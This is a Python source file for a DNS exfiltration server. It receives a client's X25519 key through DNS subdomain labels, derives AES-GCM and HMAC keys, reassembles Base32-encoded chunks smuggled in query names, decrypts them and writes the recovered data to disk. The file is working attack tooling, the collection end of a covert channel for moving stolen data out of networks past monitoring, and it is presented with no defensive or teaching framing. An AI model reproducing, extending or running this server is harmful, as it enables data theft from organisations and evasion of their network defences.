#!/usr/bin/env python3
"""
Module Name: server.py

Description:
    DNS exfiltration server with ECDH key exchange, AES-GCM decryption,
    Base32 decoding, and HMAC verification for integrity and authenticity.

    - Accepts client ephemeral public key via DNS subdomain, derives shared
      AES and HMAC keys using X25519 and HKDF.
    - Collects Base32-encoded chunks, applies padding, decodes payload bytes.
    - Validates HMAC tag, decrypts AES-GCM ciphertext, and writes output file.

Author: John Burns
Date: 2025-05-02
Version: 2.4 (Refactored for clarity)
"""

import argparse
import base64
import hashlib
import hmac
import logging
import os
import socket
import threading
import time
from collections import defaultdict

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from dnslib import DNSRecord, RR, QTYPE, A
from dotenv import load_dotenv, find_dotenv

# Configure environment and logging
load_dotenv(find_dotenv())
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('server')

# === Session State ===
fragments_by_id = defaultdict(dict)
last_seen = defaultdict(lambda: time.time())
shared_keys = {}
client_key_buffers = defaultdict(list)


# === Cryptographic Utilities ===
def derive_shared_key(server_priv, client_pub_bytes):
    """
    Derive per-session AES and HMAC keys via ECDH and HKDF.
    Returns (aes_key, hmac_key).
    """
    client_pub = x25519.X25519PublicKey.from_public_bytes(client_pub_bytes)
    shared_secret = server_priv.exchange(client_pub)
    material = HKDF(algorithm=hashes.SHA256(), length=48, salt=None, info=b'dns-exfil').derive(shared_secret)
    logger.debug("Derived shared key material")
    return material[:32], material[32:]


def decrypt_aes_gcm(aes_key, blob):
    """
    Decrypt AES-GCM blob (nonce||ciphertext+tag) and return plaintext.
    """
    nonce = blob[:12]
    ciphertext = blob[12:]
    return AESGCM(aes_key).decrypt(nonce, ciphertext, associated_data=None)


# === Base32 & HMAC ===
def pad_base32_string(b32_string):
    """
    Add '=' padding to Base32 string so its length is a multiple of 8.
    """
    pad_len = (8 - len(b32_string) % 8) % 8
    return b32_string.upper() + ('=' * pad_len)


def decode_and_split(blob_b32):
    """
    Decode Base32-encoded blob and split into payload and HMAC tag.
    Returns (payload_bytes, tag_bytes) or (None, None) on error.
    """
    try:
        raw = base64.b32decode(blob_b32)
    except Exception as e:
        logger.error(f"Base32 decode failed: {e}")
        return None, None

    if len(raw) < 32:
        logger.error("Decoded data too short for HMAC tag")
        return None, None

    return raw[:-32], raw[-32:]


def verify_hmac(payload, tag, hmac_key):
    """
    Compute and compare HMAC-SHA256 tag for payload using hmac_key.
    Returns True if valid.
    """
    expected = hmac.new(hmac_key, payload, hashlib.sha256).digest()
    logger.debug(f"Expected HMAC: {expected.hex()}")
    logger.debug(f"Received HMAC: {tag.hex()}")
    if not hmac.compare_digest(expected, tag):
        logger.error("HMAC verification FAILED")
        return False

    logger.info("HMAC verification succeeded")
    return True


# === DNS Handlers ===
def parse_qname(data):
    """
    Extract QNAME from DNS query packet bytes.
    """
    offset = 12
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            break
        offset += 1
        labels.append(data[offset:offset + length].decode('ascii'))
        offset += length
    return '.'.join(labels)


def send_dns_response(data, addr, sock):
    """
    Send a minimal DNS A response (192.0.2.1) for given request.
    """
    req = DNSRecord.parse(data)
    reply = req.reply()
    reply.add_answer(RR(req.q.qname, QTYPE.A, rdata=A('192.0.2.1'), ttl=60))
    sock.sendto(reply.pack(), addr)


# === Main Request Logic ===
def handle_key_exchange(identifier, payload):
    """
    Collect Base32-encoded client ephemeral public key fragments,
    decode when complete, derive shared AES/HMAC keys, store them.
    Returns True when keys established.
    """
    client_key_buffers[identifier].extend(payload.split('.'))
    b32 = ''.join(client_key_buffers[identifier])
    if len(b32) >= 52:
        padded = pad_base32_string(b32)
        client_pub = base64.b32decode(padded)
        aes_key, hmac_key = derive_shared_key(handle_request.server_priv, client_pub)
        shared_keys[identifier] = (aes_key, hmac_key)
        logger.info(f"[{identifier}] Session keys established")
        return True
    return False


def handle_data_chunk(identifier, index, total, payload, args, sock, addr):
    """
    Store payload chunk, and when all received, assemble and process.
    """
    fragments_by_id[identifier][int(index)] = payload
    last_seen[identifier] = time.time()

    if len(fragments_by_id[identifier]) == int(total):
        b32_str = ''.join(fragments_by_id[identifier][i] for i in sorted(fragments_by_id[identifier]))
        padded = pad_base32_string(b32_str)
        payload_bytes, tag = decode_and_split(padded)
        if payload_bytes is None:
            return

        aes_key, hmac_key = shared_keys.get(identifier, (None, None))
        if not verify_hmac(payload_bytes, tag, hmac_key):
            return

        try:
            plaintext = decrypt_aes_gcm(aes_key, payload_bytes)
            logger.info(f"[{identifier}] Decryption succeeded, length={len(plaintext)} bytes")
        except Exception as e:
            logger.error(f"[{identifier}] AES-GCM decrypt failed: {e}")
            return

        out_dir = args.output_dir
        os.makedirs(out_dir, exist_ok=True)
        file_path = os.path.join(out_dir, f"{identifier}.bin")
        with open(file_path, 'wb') as f:
            f.write(plaintext)
        logger.info(f"[{identifier}] File written: {file_path}")


def handle_request(data, addr, sock, args):
    """
    Main DNS packet handler: routes key exchange or data chunk logic.
    """
    qname = parse_qname(data).rstrip('.')
    if not qname.endswith(args.domain):
        return

    prefix = qname[:-(len(args.domain) + 1)]
    parts = prefix.split('-', 3)
    if len(parts) != 4:
        return

    identifier, index, total, payload = parts

    if index == '0' and total == '0':
        # key exchange
        handle_key_exchange(identifier, payload)
    else:
        # data chunks
        handle_data_chunk(identifier, index, total, payload, args, sock, addr)

    send_dns_response(data, addr, sock)


# === Cleanup Thread ===
# Bind server private key into handle_request for convenience
handle_request.server_priv = None


def cleanup_stale(ttl=600, interval=60):
    """
    Periodically remove sessions idle longer than TTL.
    """
    while True:
        now = time.time()
        for ident, timestamp in list(last_seen.items()):
            if now - timestamp > ttl:
                fragments_by_id.pop(ident, None)
                shared_keys.pop(ident, None)
                client_key_buffers.pop(ident, None)
                last_seen.pop(ident, None)
                logger.info(f"[{ident}] Session expired and cleaned up")
        time.sleep(interval)


def start_server(args):
    """
    Initialize server state, load private key, and begin listening.
    """
    if not args.server_key:
        raise ValueError("Missing server private key path")

    with open(args.server_key, 'rb') as f:
        priv = x25519.X25519PrivateKey.from_private_bytes(f.read())
    handle_request.server_priv = priv

    thread = threading.Thread(target=cleanup_stale, daemon=True)
    thread.start()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', args.port))
    sock.settimeout(1)
    logger.info(f"Listening on UDP/{args.port}...")

    try:
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                threading.Thread(target=handle_request, args=(data, addr, sock, args), daemon=True).start()
            except socket.timeout:
                continue
    except KeyboardInterrupt:
        logger.info("Shutting down server")
    finally:
        sock.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="DNS Exfiltration Server (ECDH + AES-GCM + HMAC)")
    parser.add_argument('--port', type=int, default=5300)
    parser.add_argument('--output-dir', default='output')
    parser.add_argument('--domain', default='xf.example.com')
    parser.add_argument('--server-key', default=os.getenv('SERVER_PRIVATE_KEY'), help='Path to X25519 private key file')
    args = parser.parse_args()
    start_server(args)
